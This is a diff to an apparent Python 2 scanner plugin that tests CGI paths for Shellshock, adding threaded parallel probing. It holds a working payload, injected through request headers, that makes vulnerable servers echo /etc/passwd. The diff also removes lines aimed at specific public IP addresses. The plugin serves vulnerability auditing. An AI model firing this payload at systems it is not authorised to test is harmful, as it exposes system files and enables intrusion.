@@ -4,6 +4,8 @@
 # Shellshock cgi test
 # https://github.com/nccgroup/shocker
 import urlparse
+import Queue
+
 
 def assign(service,arg):
     if service=='www':
@@ -421,22 +423,43 @@ def audit(arg):
 /wwwadmin.cgi
 /wwwboard.cgi
 /wwwboard/wwwboard.cgi'''
+
+
     def shock_check(target):
         head='UserAgent: () { :;};echo $(</etc/passwd);\nCookie: () { :;};echo $(</etc/passwd);\nReferer: () { :;};echo $(</etc/passwd);'
         code,head,res,errcode,_=curl.curl2(target,header=head)
         if code ==200 and ':bin:/bin:' in head+res:
             security_hole(target)
-            
+
+    links = Queue.Queue()
     if arg.endswith('cgi'):
         shock_check(arg)
     else:
         arg=arg.rstrip('/')
         payload=payload.splitlines()
         for p in payload:
-            shock_check(arg + p)
+            links.put(arg + p)
+        
+        Thread_Pool_Obj = ThreadPool(10)
+        while True:
+            Busy = Thread_Pool_Obj.busy()  # 繁忙
+
+            if links.qsize():
+                for x in range(min(Thread_Pool_Obj.idel(), links.qsize())):
+
+                    try:
+                        target = links.get_nowait()
+                        Thread_Pool_Obj.push(shock_check, target)
+
+                    except Exception as error_info:
+                        print "[!!!] queue error:>>> ", error_info
+
+            elif Busy == 0:
+                break
+            Thread_Pool_Obj.wait_for_idel(5)
+        Thread_Pool_Obj.wait()
 
 if __name__ == "__main__":
     from dummy import *
-    # audit(assign('www','http://66.60.130.147/')[1]) #/cgi-bin/ezadmin.cgi
-    # audit(assign('www','http://119.254.70.180/cgi-bin/test-cgi')[1]) #/cgi-bin/test-cgi #dead
-    audit(assign('www','http://222.180.125.62/')[1]) #/ucsm/isSamInstalled.cgi
+
+    audit(assign('www','http://127.0.0.1/')[1]) #/ucsm/isSamInstalled.cgi
